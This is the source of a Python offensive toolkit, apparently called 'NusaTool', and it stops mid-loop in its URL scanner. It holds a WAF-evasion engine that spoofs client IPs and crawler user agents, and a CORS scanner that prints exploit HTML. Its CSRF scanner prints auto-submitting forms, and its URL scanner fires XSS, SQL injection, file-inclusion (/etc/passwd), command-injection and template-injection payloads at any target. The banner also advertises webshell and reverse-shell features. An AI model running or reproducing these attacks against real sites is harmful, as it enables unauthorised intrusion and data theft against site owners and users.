#!/workspaces/nusantaratools/.venv/bin/python3
"""
NusaTool v1.2.0 — All-in-One Hacking Toolkit
  • AutoPwn (8-phase auto hack)
  • URL Scanner (XSS, SQLi, LFI, Redirect, CMDi, SSTI)
  • CORS Scanner • CSRF Scanner • CVE Checker
  • WAF Bypass Engine (12+ techniques)
  • JSON/HTML Report Export
"""

import argparse, sys, os, socket, threading, time, datetime, json, hashlib, random, string, base64, subprocess, re
import requests, urllib.parse
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import urlparse, parse_qs, urljoin
from queue import Queue
from html import escape
import concurrent.futures

def phase_timeout(seconds):
    """Decorator to enforce a timeout on a phase function."""
    def decorator(func):
        def wrapper(*args, **kwargs):
            ex = concurrent.futures.ThreadPoolExecutor(max_workers=1)
            fut = ex.submit(func, *args, **kwargs)
            try:
                return fut.result(timeout=seconds)
            except concurrent.futures.TimeoutError:
                print(f"  {Y}⚠ Phase timed out ({seconds}s){N}")
                return None
            finally:
                ex.shutdown(wait=False)  # don't block waiting for the thread
        return wrapper
    return decorator

VERSION = "1.3.0"

R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"
B = "\033[94m"; M = "\033[95m"; C = "\033[96m"
W = "\033[97m"; D = "\033[90m"; N = "\033[0m"
BOLD = "\033[1m"; DIM = "\033[2m"

shutil = __import__('shutil')

def cw():
    return shutil.get_terminal_size().columns if hasattr(shutil, 'get_terminal_size') else 60

def header(t):
    w = cw()
    print(f"\n{BG_BLUE}{BOLD}{W}  {t}  {N}")
    print(f"{DIM}{C}{'─' * w}{N}")

BG_BLUE = "\033[44m"

def ptable(headers, rows, colors=None):
    if not rows: return
    col_w = [max(len(str(h)), max((len(str(r[i])) for r in rows), default=0)) for i, h in enumerate(headers)]
    sep = " │ "
    print(f"\n{BOLD}{C}{sep.join(f'{h:<{col_w[i]}}' for i, h in enumerate(headers))}{N}")
    print(f"{D}{C}{'─' * (sum(col_w) + len(sep) * (len(headers) - 1))}{N}")
    for ri, row in enumerate(rows):
        c = colors[ri] if colors and ri < len(colors) else W
        print(f"{c}{sep.join(f'{str(row[i]):<{col_w[i]}}' for i in range(len(row)))}{N}")

BANNER = f"""{R}
  ███╗   ██╗██╗   ██╗███████╗ █████╗ ████████╗ ██████╗  ██████╗ ██╗
  ████╗  ██║██║   ██║██╔════╝██╔══██╗╚══██╔══╝██╔═══██╗██╔═══██╗██║
  ██╔██╗ ██║██║   ██║███████╗███████║   ██║   ██║   ██║██║   ██║██║
  ██║╚██╗██║██║   ██║╚════██║██╔══██║   ██║   ██║   ██║██║   ██║██║
  ██║ ╚████║╚██████╔╝███████║██║  ██║   ██║   ╚██████╔╝╚██████╔╝███████╗
  ╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
{N}{D}  ════════════════════════════════════════════════════════════════════{N}
   {C}ALL-IN-ONE HACKING TOOLKIT{N}{D}   v{VERSION}{N}{D}   [{R}AUTOHACK{N}{D}][{G}WEBSHELL{N}{D}][{Y}REVSHELL{N}{D}][{M}LFI2RCE{N}{D}][{B}SQLDUMP{N}{D}]{N}
{C}  ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{N}
"""


def check_update():
    """Check GitHub for newer version."""
    try:
        r = requests.get("https://raw.githubusercontent.com/anomalyco/nusatool/main/nusatool.py", timeout=5)
        for line in r.text.split("\n"):
            if line.startswith("VERSION = "):
                v = line.split('"')[1]
                if v != VERSION:
                    print(f"  {Y}⬆ Update available: v{VERSION} → v{v}{N}")
                    print(f"  {C}  https://github.com/anomalyco/nusatool{N}")
                return
    except: pass


# ══════════════════════════════════════════════════════
#  BYPASS ENGINE (Enhanced)
# ══════════════════════════════════════════════════════

class BypassEngine:
    def __init__(self, target_url, proxy=None):
        self.url = target_url; self.waf_detected = False; self.waf_name = None
        self.connected = False; self.connect_error = None; self.status_code = None
        self.bypass_headers = {}; self.ua_list = []; self.proxy = proxy
        self._session = requests.Session()
        self._session.verify = False
        if proxy: self._session.proxies = {"http": proxy, "https": proxy}
        retry = requests.adapters.Retry(total=1, connect=1, read=1, backoff_factor=0.1)
        adapter = requests.adapters.HTTPAdapter(max_retries=retry)
        self._session.mount("http://", adapter)
        self._session.mount("https://", adapter)
        self._detect_waf(); self._build_headers()

    def check_connection(self):
        """Test connectivity and return True if reachable."""
        if self.connected:
            return True
        try:
            r = self._session.get(self.url, timeout=10)
            self.status_code = r.status_code
            self.connected = True
            return True
        except requests.ConnectionError as e:
            self.connect_error = f"Connection failed: {e}"
            return False
        except requests.Timeout:
            self.connect_error = "Connection timeout (10s)"
            return False
        except Exception as e:
            self.connect_error = f"{e}"
            return False

    def _detect_waf(self):
        try:
            r = self._session.get(self.url, timeout=10)
            self.connected = True
            self.status_code = r.status_code
            self.waf_raw = r.text
            sigs = {
                "Cloudflare": ["cloudflare", "__cfduid", "cf-ray", "cf-request-id"],
                "ModSecurity": ["mod_security", "modsecurity", "405 not allowed", "not acceptable"],
                "AWS WAF": ["awswaf", "x-amzn-", "aws", "x-amz-request-id"],
                "Akamai": ["akamai", "akamaighost", "akamaipixel"],
                "Imperva": ["incapsula", "imperva", "x-iinfo"],
                "Sucuri": ["sucuri", "cloudproxy", "sucuri-cloudproxy"],
                "Barracuda": ["barracuda", "barra"],
                "F5 BIG-IP": ["bigip", "f5", "ts01cbe", "x-application-context"],
                "Fortinet": ["fortigate", "fortiwaf", "fortiweb"],
                "Wordfence": ["wordfence", "wfblock"],
                "Comodo WAF": ["comodo", "cwatch"],
                "Radware": ["radware", "appwall", "x-sl-compstate"],
                "Citrix Netscaler": ["netscaler", "citrix", "ns-"],
                "DenyALL": ["denyall", "rbl"],
                "Safe3 WAF": ["safe3", "safe3waf"],
                "NAXSI": ["naxsi", "blocked by naxsi"],
                "WebKnight": ["webknight", "webknight"],
                "Airlock": ["airlock", "x-ua-compatible"],
                "Yundun": ["yundun", "yundunwaf"],
                "Safedog": ["safedog", "safedogwaf"],
                "DDoS-Guard": ["ddos-guard", "x-ddos-guard"],
                "Varnish": ["varnish", "x-varnish"],
                "Litespeed": ["litespeed", "x-litespeed-cache"],
                "StackPath": ["stackpath", "stackpathcdn"],
                "Fastly": ["fastly", "x-fastly"],
                "KeyCDN": ["keycdn", "x-keycdn"],
                "Azure WAF": ["azure", "x-ms-request-id", "x-azure"],
                "GCP Cloud Armor": ["cloud-armor", "x-cloud-trace", "gcp"],
                "BlockDoS": ["blockdos", "x-blockdos"],
                "Reblaze": ["reblaze", "x-reblaze"],
                "NSFocus": ["nsfocus", "nsfocuswaf"],
                "U.S. Robotics": ["usrobotics", "usr"],
                "Chaitin SafeLine": ["safeline", "safelinewaf", "chaitin"],
                "Huawei Cloud WAF": ["huawei", "hwwaf"],
                "Baidu Yunjiasu": ["yunjiasu", "baidu"],
                "Alibaba Cloud WAF": ["aliyundun", "waf_alert"],
                "Qcloud (Tencent)": ["qcloud", "tencentwaf", "txwaf"],
                "WangZhan": ["wangzhan", "wangzhanwaf"],
                "HTTP:BL (Project Honey)": ["httpbl", "projecthoneypot"],
                "Kona SiteDefender": ["kona", "sitedefender", "akamaikona"],
                "Palo Alto": ["panw", "paloalto", "x-pan"],
                "SEnginx": ["senginx", "se-nginx"],
                "URLScan": ["urlscan", "rejected-by-urlscan"],
                "Profense": ["profense", "pl-"],
                "ZScaler": ["zscaler", "zscalertwo"],
                "NullDDoS": ["nullddos", "x-null"],
                "CrawlProtect": ["crawlprotect", "x-crawl"],
            }
            for name, sigs_list in sigs.items():
                for sig in sigs_list:
                    if sig in r.text.lower() or any(sig in str(h).lower() for h in r.headers):
                        self.waf_detected = True; self.waf_name = name; return
            if r.status_code in (403, 406, 501, 503):
                blocked_words = ["blocked", "denied", "forbidden", "rejected", "unauthorized", "waf"]
                if any(b in r.text.lower() for b in blocked_words):
                    self.waf_detected = True; self.waf_name = "Generic WAF / Blocking"; return
        except requests.ConnectionError as e:
            self.connect_error = f"Connection failed: {e}"
        except requests.Timeout:
            self.connect_error = "Connection timeout (10s)"
        except Exception as e:
            self.connect_error = f"{e}"

    def _build_headers(self):
        self.ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
            "curl/8.4.0", "Wget/1.21.4", "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.6099.230 Mobile Safari/537.36",
        ]
        self.bypass_headers = {
            "X-Forwarded-For": self._rand_ip(), "X-Real-IP": self._rand_ip(),
            "X-Originating-IP": self._rand_ip(), "X-Remote-IP": self._rand_ip(),
            "X-Remote-Addr": self._rand_ip(), "X-Client-IP": self._rand_ip(),
            "X-Forwarded-Proto": "https", "X-Forwarded-Scheme": "https",
            "X-Forwarded-Host": urlparse(self.url).netloc if self.url else "localhost",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",             "Accept-Encoding": "gzip, deflate",
            "Cache-Control": "no-cache, no-store", "Pragma": "no-cache",
            "Upgrade-Insecure-Requests": "1",
        }

    def _rand_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

    def encode(self, payload, technique="auto"):
        techs = {
            "url": urllib.parse.quote(payload),
            "double_url": urllib.parse.quote(urllib.parse.quote(payload)),
            "unicode": "".join(f"\\u{ord(c):04x}" for c in payload),
            "hex": "0x" + payload.encode().hex(),
            "base64": base64.b64encode(payload.encode()).decode(),
            "mixed": "".join(c.upper() if random.randint(0,1) else c.lower() for c in payload),
            "comment": self._comment(payload), "tab": payload.replace(" ", "\t"),
            "newline": payload.replace(" ", "\\n"), "nullbyte": payload.replace(" ", "\\x00"),
            "utf16": payload.encode("utf-16").hex(),
            "html": "".join(f"&#{ord(c)};" if c in "<>\"'" else c for c in payload),
            "reverse": payload[::-1],
        }
        if technique == "auto":
            t = random.choice(list(techs.keys())); return techs[t], t
        return techs.get(technique, payload), technique

    def _comment(self, payload):
        if "'" in payload:
            return "'/*" + ''.join(random.choices(string.ascii_letters, k=3)) + "*/".join(payload.split("'")[1:])
        if " " in payload: return payload.replace(" ", "/**/")
        return payload

    def get(self, url, **kwargs):
        hdrs = {**self.bypass_headers, "User-Agent": random.choice(self.ua_list), **kwargs.pop("headers", {})}
        if self.waf_detected: hdrs["X-Forwarded-For"] = self._rand_ip()
        kwargs.setdefault("timeout", (5, 8))  # (connect, read)
        return self._session.get(url, headers=hdrs, **kwargs)

    def post(self, url, **kwargs):
        hdrs = {**self.bypass_headers, "User-Agent": random.choice(self.ua_list), **kwargs.pop("headers", {})}
        kwargs.setdefault("timeout", (5, 8))
        return self._session.post(url, headers=hdrs, **kwargs)

    def info(self):
        if self.connect_error:
            return f"  {R}✘ {self.connect_error}{N}"
        if self.waf_detected:
            return f"  {Y}⚠ WAF: {BOLD}{self.waf_name}{N}{D}  bypass active ({len(self.bypass_headers)} headers){N}"
        if self.status_code in (403, 401, 503):
            return f"  {R}⚠ Blocked{N}{D}  [HTTP {self.status_code} — access denied]{N}"
        status = f"  {G}✔ Reachable{N}{D}  [HTTP {self.status_code}]{N}" if self.connected else ""
        waf = f"  {G}✔ No WAF detected{N}"
        return f"{status}\n{waf}"


# ══════════════════════════════════════════════════════
#  CORS SCANNER
# ══════════════════════════════════════════════════════

class CORSScanner:
    def __init__(self, url, bypass=None):
        self.url = url.rstrip("/"); self.bypass = bypass or BypassEngine(url); self.vulns = []

    def scan(self):
        header("CORS EXPLOITER — ORIGIN MISCONFIG")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n"); return []
        origins = [
            "https://evil.com", "null", "http://evil.com",
            "https://evil.com.evil.com", "https://evil.com/",
            "http://localhost", "https://evil.com%40", "http://127.0.0.1",
            "https://evil.com@", "https://evil.com#",
        ]
        print(f"  {C}◉{N} Testing {len(origins)} origins...\n")
        errors = 0
        for origin in origins:
            try:
                r = self.bypass.get(self.url, headers={"Origin": origin, "Referer": origin}, timeout=10)
                acao = r.headers.get("Access-Control-Allow-Origin", "")
                acac = r.headers.get("Access-Control-Allow-Credentials", "")
                if acao == "*":
                    self.vulns.append({"origin": origin, "issue": "Wildcard ACAO (*)", "acao": acao, "acac": acac})
                    print(f"  {R}[!] CRITICAL{N} Wildcard CORS: {Y}{origin}{N}  {D}→ ACAO: *{N}")
                elif acao == origin or (acao and origin in acao):
                    risk = f"Reflect: {acao}"
                    if acac.lower() == "true":
                        risk += " + Credentials!"
                        self.vulns.append({"origin": origin, "issue": "Reflected ACAO + Credentials", "acao": acao, "acac": acac})
                        print(f"  {R}[!] HIGH{N} {Y}{origin}{N}  {D}→ ACAO: {acao} | Credentials: {acac}{N}")
                    else:
                        self.vulns.append({"origin": origin, "issue": "Reflected ACAO", "acao": acao, "acac": acac})
                        print(f"  {Y}[!] MEDIUM{N} {Y}{origin}{N}  {D}→ ACAO: {acao}{N}")
                elif acao:
                    print(f"  {D}[?] CORS: {Y}{origin}{N} → ACAO: {acao}{N}")
            except requests.RequestException as e:
                errors += 1
                if errors == 1: print(f"  {R}⚠{N} Request failed: {e}")
        if errors > 1: print(f"  {R}⚠{N} ...and {errors-1} more")

        if self.vulns:
            print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} CORS issue(s)!{N}")
            ptable(["#","ORIGIN","ISSUE"], [[str(i+1),v["origin"][:35],v["issue"]] for i,v in enumerate(self.vulns)], colors=[R]*len(self.vulns))
            print(f"\n  {BOLD}{C}PoC EXPLOIT HTML{N}")
            for v in self.vulns:
                print(f"""  {W}<html>
  <body>
  <h1>CORS PoC — {v['origin']}</h1>
  <script>
  var xhr = new XMLHttpRequest();
  xhr.open('GET', '{self.url}', true);
  xhr.withCredentials = {'true' if 'Credentials' in v['issue'] else 'false'};
  xhr.onload = function() {{ alert(xhr.responseText); }};
  xhr.send();
  </script>
  </body>
  </html>{N}""")
        else:
            print(f"\n  {G}✔{N} No CORS misconfigurations detected.")
        print(); return self.vulns


# ══════════════════════════════════════════════════════
#  CSRF SCANNER
# ══════════════════════════════════════════════════════

class CSRFScanner:
    def __init__(self, url, bypass=None):
        self.url = url.rstrip("/"); self.bypass = bypass or BypassEngine(url); self.vulns = []
        self.csrf_keywords = ["csrf", "token", "nonce", "_token", "authenticity_token",
                              "xsrf", "csrf_token", "csrfmiddlewaretoken", "__csrf"]

    def scan(self):
        header("CSRF EXPLOITER — TOKEN BYPASS + PoC")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n"); return []

        try:
            r = self.bypass.get(self.url, timeout=10)
            forms = []; i = 0
            while True:
                fs = r.text.find("<form", i)
                if fs == -1: break
                fe = r.text.find("</form>", fs)
                if fe == -1: break
                forms.append(r.text[fs:fe+7]); i = fe + 7

            if not forms:
                print(f"  {Y}⚠{N} No forms found.\n"); return []

            print(f"  {C}◉{N} Found {len(forms)} form(s)\n")

            for fi, form in enumerate(forms):
                method = "GET"
                if 'method=' in form[:200]:
                    ms = form[:200].lower().find('method=')
                    me = form[:200].find('"', ms+8) if form[:200].find('"', ms+8) > ms else form[:200].find("'", ms+8)
                    if me > ms: method = form[:200][ms+7:me].upper()

                inputs = []
                j = 0
                while True:
                    is_ = form.find("<input", j)
                    if is_ == -1: break
                    ie = form.find(">", is_)
                    if ie == -1: break
                    inp = form[is_:ie+1]
                    nm = re.search(r'name=["\']([^"\']+)["\']', inp)
                    ty = re.search(r'type=["\']([^"\']+)["\']', inp)
                    name = nm.group(1) if nm else ""
                    itype = ty.group(1) if ty else ""
                    inputs.append({"name": name, "type": itype})
                    j = ie + 1

                has_csrf = any(any(kw in inp["name"].lower() for kw in self.csrf_keywords) for inp in inputs if inp["name"])

                action = ""
                am = re.search(r'action=["\']([^"\']+)["\']', form[:300])
                if am: action = am.group(1)

                if not has_csrf and method == "POST":
                    action_url = urljoin(self.url, action) if action else self.url
                    self.vulns.append({"form": fi+1, "method": method, "action": action_url, "inputs": [i for i in inputs if i["name"]], "issue": "No CSRF token"})
                    print(f"  {R}[!] VULN #{fi+1}{N} Method: {Y}{method}{N}  Action: {Y}{action_url}{N}")
                    print(f"      {R}→ No CSRF token!{N}")
                    for inp in inputs:
                        if inp["name"]: print(f"      {D}param: {inp['name']} ({inp['type']}){N}")
                elif has_csrf:
                    print(f"  {G}[✔] Form #{fi+1}{N} CSRF protected")
                elif method == "GET":
                    print(f"  {D}[−] Form #{fi+1}{N} GET method")
        except Exception as e:
            print(f"  {R}✘{N} CSRF error: {e}")

        if self.vulns:
            print(f"\n  {R}{BOLD}⚠ {len(self.vulns)} CSRF vulnerable form(s)!{N}")
            print(f"\n  {BOLD}{C}PoC HTML FORMS{N}")
            for v in self.vulns:
                html_fields = "\n".join(f'    <input type="text" name="{i["name"]}" value="pwned">' for i in v["inputs"] if i["name"])
                action_attr = f'action="{v["action"]}"' if v["action"] else ""
                print(f"""  {W}<form {action_attr} method="{v["method"]}">
{html_fields}
    <input type="submit" value="Submit">
  </form>
  <script>document.forms[0].submit();</script>{N}""")
        else:
            print(f"\n  {G}✔{N} No CSRF issues.")
        print(); return self.vulns


# ══════════════════════════════════════════════════════
#  CVE CHECKER
# ══════════════════════════════════════════════════════

class CVEChecker:
    def __init__(self):
        self.cve_db = {
            "apache httpd": {"2.4.49": ["CVE-2021-41773 (Path Traversal)", "HIGH"],
                             "2.4.50": ["CVE-2021-42013 (Path Traversal)", "HIGH"],
                             "2.4.52": ["CVE-2022-26377 (HTTP Request Smuggling)", "MEDIUM"],
                             "2.4.6": ["CVE-2014-0098 (NULL Pointer Dereference)", "MEDIUM"],
                             "2.2.34": ["CVE-2017-9798 (Optionsbleed)", "HIGH"]},
            "nginx": {"1.20.0": ["CVE-2021-23017 (DNS Resolver)", "HIGH"],
                      "1.18.0": ["CVE-2021-23017 (DNS Resolver)", "HIGH"],
                      "1.14.0": ["CVE-2019-9516 (HTTP/2 0-Length)", "MEDIUM"],
                      "1.13.0": ["CVE-2019-20372 (Directory Traversal)", "MEDIUM"],
                      "1.4.0": ["CVE-2017-7529 (Integer Overflow)", "HIGH"]},
            "openssh": {"8.0": ["CVE-2019-16905 (Integer Overflow)", "HIGH"],
                        "7.9": ["CVE-2019-25031 (Vulnerability)", "MEDIUM"],
                        "7.7": ["CVE-2018-20685 (User Enum)", "LOW"],
                        "7.2": ["CVE-2016-6210 (User Enum)", "LOW"],
                        "6.8": ["CVE-2018-15473 (User Enum)", "LOW"],
                        "5.9": ["CVE-2015-5600 (MaxAuthTries)", "MEDIUM"]},
            "mysql": {"5.7.35": ["CVE-2021-35604 (DoS)", "MEDIUM"],
                      "5.6.51": ["CVE-2020-14878 (DDoS)", "HIGH"],
                      "5.5.62": ["CVE-2020-25722 (Vulnerability)", "MEDIUM"],
                      "8.0.27": ["CVE-2022-21263 (Privilege Escalation)", "HIGH"]},
            "php": {"5.6.40": ["CVE-2019-11043 (Remote Code Execution)", "CRITICAL"],
                    "7.0.33": ["CVE-2019-11043 (Remote Code Execution)", "CRITICAL"],
                    "7.1.33": ["CVE-2019-11043 (Remote Code Execution)", "CRITICAL"],
                    "7.2.34": ["CVE-2021-21703 (Privilege Escalation)", "HIGH"],
                    "7.3.31": ["CVE-2021-21703 (Privilege Escalation)", "HIGH"],
                    "7.4.24": ["CVE-2021-21703 (Privilege Escalation)", "HIGH"],
                    "8.0.11": ["CVE-2021-21703 (Privilege Escalation)", "HIGH"]},
            "proftpd": {"1.3.5": ["CVE-2015-3306 (File Copy RCE)", "CRITICAL"],
                        "1.3.6": ["CVE-2020-9272 (RCE)", "CRITICAL"]},
            "openssl": {"1.0.1": ["CVE-2014-0160 (Heartbleed)", "CRITICAL"],
                        "1.0.2": ["CVE-2016-2107 (Padding Oracle)", "MEDIUM"]},
            "vsftpd": {"2.3.4": ["CVE-2011-2523 (Backdoor RCE)", "CRITICAL"]},
            "tomcat": {"8.5.0": ["CVE-2017-12617 (RCE)", "CRITICAL"],
                       "9.0.0": ["CVE-2019-0232 (RCE)", "CRITICAL"],
                       "7.0.0": ["CVE-2017-12615 (PUT RCE)", "CRITICAL"]},
            "wordpress": {"4.7.0": ["CVE-2017-1001000 (REST API)", "HIGH"],
                          "4.7.1": ["CVE-2017-1001000 (REST API)", "HIGH"],
                          "5.0.0": ["CVE-2019-8942 (RCE)", "CRITICAL"],
                          "5.0.1": ["CVE-2019-8942 (RCE)", "CRITICAL"],
                          "5.1.0": ["CVE-2019-9787 (XSS)", "MEDIUM"]},
            "drupal": {"7.0": ["CVE-2014-3704 (Drupalgeddon SQLi)", "CRITICAL"],
                       "8.0": ["CVE-2018-7600 (Drupalgeddon2 RCE)", "CRITICAL"]},
            "joomla": {"3.0.0": ["CVE-2015-8623 (SQLi)", "HIGH"],
                       "3.4.0": ["CVE-2015-7297 (RCE)", "CRITICAL"]},
            "elasticsearch": {"1.4.0": ["CVE-2015-1427 (RCE)", "CRITICAL"],
                              "1.5.0": ["CVE-2015-1427 (RCE)", "CRITICAL"]},
            "mongodb": {"2.6.0": ["CVE-2017-17585 (DoS)", "MEDIUM"]},
            "redis": {"2.8.0": ["CVE-2015-4335 (Lua Sandbox)", "HIGH"],
                      "3.2.0": ["CVE-2016-8339 (Protocol)", "MEDIUM"]},
            "jenkins": {"2.0.0": ["CVE-2017-1000353 (RCE)", "CRITICAL"],
                        "2.50.0": ["CVE-2018-1000861 (RCE)", "CRITICAL"]},
            "gitlab": {"8.0.0": ["CVE-2016-4340 (RCE)", "CRITICAL"],
                       "10.0.0": ["CVE-2018-19571 (SSRF)", "HIGH"]},
            "docker": {"18.06.0": ["CVE-2019-13139 (RCE)", "HIGH"],
                       "19.03.0": ["CVE-2020-13401 (RCE)", "HIGH"]},
            "kubernetes": {"1.13.0": ["CVE-2019-1002100 (Priv Esc)", "HIGH"],
                           "1.16.0": ["CVE-2020-8554 (MITM)", "MEDIUM"]},
        }

    def check(self, service, version):
        service = service.lower()
        results = []
        for sname, versions in self.cve_db.items():
            if sname in service:
                for ver, cve in versions.items():
                    if version.startswith(ver[:3]):
                        results.append({"cve": cve[0], "severity": cve[1], "service": sname, "version": version})
        return results

    def scan_from_banners(self, banners):
        header("CVE EXPLOIT CHECK — VULNERABILITY DATABASE")
        print(f"  {C}◉{N} Checking {len(banners)} service(s) against CVE database...\n")
        all_results = []
        for b in banners:
            svc = b.get("service", "").lower()
            ban = (b.get("banner") or "").lower()
            version = ""
            import re
            vm = re.search(r'[\d]+\.[\d]+(?:\.[\d]+)?', ban or "")
            if vm: version = vm.group()
            if not version: continue
            results = self.check(svc, version)
            for r in results:
                all_results.append(r)
                sev_color = {"CRITICAL": R+BOLD, "HIGH": R, "MEDIUM": Y, "LOW": G}.get(r["severity"], W)
                print(f"  {sev_color}[!]{N} {Y}{r['service']}{N} {D}v{version}{N}")
                print(f"      {sev_color}{r['cve']}{N}  {D}[{r['severity']}]{N}")

        if not all_results:
            print(f"  {G}✔{N} No known CVEs matched (or version unknown).")
        else:
            print(f"\n  {R}{BOLD}⚠ {len(all_results)} potential CVE(s) found!{N}")
            ptable(["#", "SERVICE", "CVE", "SEVERITY"],
                   [[str(i+1), r["service"], r["cve"][:45], r["severity"]] for i, r in enumerate(all_results)],
                   colors=[R if r["severity"] in ("CRITICAL","HIGH") else Y for r in all_results])
        print(); return all_results


# ══════════════════════════════════════════════════════
#  URL VULNERABILITY SCANNER (6-in-1)
# ══════════════════════════════════════════════════════

class URLScanner:
    def __init__(self, url, bypass=None):
        self.url = url; self.bypass = bypass or BypassEngine(url)
        self.vulns = []; self.parsed = urlparse(url)
        self.params = list(parse_qs(self.parsed.query).keys()) if parse_qs(self.parsed.query) else []
        self.errors = []

    def _req(self, u, method="GET", data=None):
        try:
            return self.bypass.get(u, timeout=10, allow_redirects=False) if method == "GET" else self.bypass.post(u, data=data, timeout=10, allow_redirects=False)
        except: return None

    def _test_xss(self, param):
        marker = f"NUSAURLXSS_{random.randint(10000,99999)}_PROOF"
        for payload in [f"<script>alert('{marker}')</script>", f"<img src=x onerror=alert('{marker}')>",
            f'"><script>alert("{marker}")</script>', f"<svg onload=alert('{marker}')>"]:
            new = urllib.parse.urlencode({k: (payload if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
            r = self._req(u)
            if r and marker in (r.text or ""):
                idx = r.text.find(marker)
                ctx = r.text[max(0,idx-40):idx+len(marker)+40].strip()
                return ("XSS", payload, u, f"Reflected: {ctx[:120]}")
        return None

    def _test_sqli(self, param):
        for payload in ["'", "' OR '1'='1--", "' OR 1=1--", "\" OR \"1\"=\"1", "' UNION SELECT 1,2,3--"]:
            new = urllib.parse.urlencode({k: (payload if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
            r = self._req(u)
            if not r: continue
            for p in ["sql","syntax error","mysql","odbc","oracle","postgresql","unclosed quotation","ora-"]:
                if p in (r.text or "").lower(): return ("SQLi", payload, u, f"DB error: {p}")
            if r.status_code in (500, 404, 403): return ("SQLi", payload, u, f"HTTP {r.status_code}")
        return None

    def _test_lfi(self, param):
        for pay in ["../../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "/etc/passwd",
                     "php://filter/convert.base64-encode/resource=index"]:
            new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
            r = self._req(u)
            if not r: continue
            if "root:x:" in (r.text or ""): return ("LFI", pay, u, "Read /etc/passwd ✅")
            if "PD9waHA" in (r.text or ""): return ("LFI (PHP filter)", pay, u, "Base64-encoded source ✅")
            if "[extensions]" in (r.text or "").lower(): return ("LFI (win.ini)", pay, u, "Read Windows config ✅")
        return None

    def _test_redirect(self, param):
        for pay in ["//evil.com", "https://evil.com/"]:
            new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
            r = self._req(u)
            if r and r.status_code in (301, 302, 307, 308):
                loc = r.headers.get("Location", "")
                if "evil" in loc: return ("Open Redirect", pay, u, f"Redirects to: {loc}")
        return None

    def _test_cmdi(self, param):
        for pay in [";id", "|id", "`id`", "$(id)"]:
            new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
            r = self._req(u)
            if r and ("uid=" in (r.text or "") or "gid=" in (r.text or "")):
                match = re.search(r'uid=\d+\(\w+\)\s+gid=\d+\(\w+\)', r.text or "")
                if match: return ("Command Injection", pay, u, f"Output: {match.group()}")
        return None

    def _test_ssti(self, param):
        # Use unique marker to avoid false positives
        marker = random.randint(1000,9999)
        expected = str(marker * 7)
        for pay in [f"{{{{{marker}*7}}}}", f"${{{{{marker}*7}}}}", f"<%={marker*7}%>"]:
            new = urllib.parse.urlencode({k: (pay if k == param else v[0]) for k, v in parse_qs(self.parsed.query).items()})
            u = f"{self.parsed.scheme}://{self.parsed.netloc}{self.parsed.path}?{new}"
            r = self._req(u)
            if r and expected in (r.text or ""):
                # Verify it's NOT in the normal response (no param injection)
                r2 = self._req(self.url)
                if r2 and expected not in (r2.text or ""):
                    return ("SSTI (Jinja2/Twig)", pay, u, f"{marker}*7 = {expected} ✅")
        return None

    def scan(self):
        header("URL EXPLOIT — 6-IN-1 SCANNER + PROOF")
        print(f"  {C}◉{N} URL  : {Y}{self.url}{N}")
        print(f"  {self.bypass.info()}{N}")
        if self.bypass.connect_error:
            print(f"\n  {R}✘{N} Target unreachable.\n"); return []
        if not self.params:
            print(f"  {Y}⚠{N} No params. Use ParamSpider first.\n"); return []
        print(f"  {C}◉{N} Params: {len(self.params)} | Scans: {Y}XSS, SQLi, LFI, Redirect, CMDi, SSTI{N}\n")

        tests = [("XSS", self._test_xss), ("SQLi", self._test_sqli), ("LFI", self._test_lfi),
                 ("Redirect", self._test_redirect), ("CMDi", self._test_cmdi), ("SSTI", self._test_ssti)]
        total = len(tests) * len(self.params); done = 0
        for vname, func in tests:
            for param in self.params:
                done += 1
                print(f"  {D}[{done}/{total}] {vname} → {param}...{N}", end="\r")
                try:
                    result = func(param)
                    if result:
                        typ, pay, u, extra = result
                        self.vulns.append({"type": typ, "param": param, "payload": pay, "url": u, "extra": extra})
                        print(f"\n  {R}{BOLD}[!] {typ}{N}  {Y}{param}{N}")
                        print(f"      {W}{extra}{N}")
